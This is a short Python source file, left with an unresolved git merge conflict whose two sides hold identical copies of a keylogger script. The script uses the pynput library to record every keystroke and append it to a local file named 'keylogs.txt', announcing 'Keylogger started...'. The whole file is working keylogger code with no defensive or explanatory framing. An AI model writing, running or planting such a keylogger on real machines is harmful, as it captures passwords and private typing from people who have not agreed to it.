<<<<<<< HEAD

from pynput import keyboard

filename = "keylogs.txt"

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = str(key)
    
    with open(filename, 'a') as logs:
        logs.write(char + '\n')

print("Keylogger started...")
with keyboard.Listener(on_press=on_press) as listener:
=======

from pynput import keyboard

filename = "keylogs.txt"

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = str(key)
    
    with open(filename, 'a') as logs:
        logs.write(char + '\n')

print("Keylogger started...")
with keyboard.Listener(on_press=on_press) as listener:
>>>>>>> 4e7fe0a0c9d5743a2cd99c0b6f3e51bc2876faf3
    listener.join()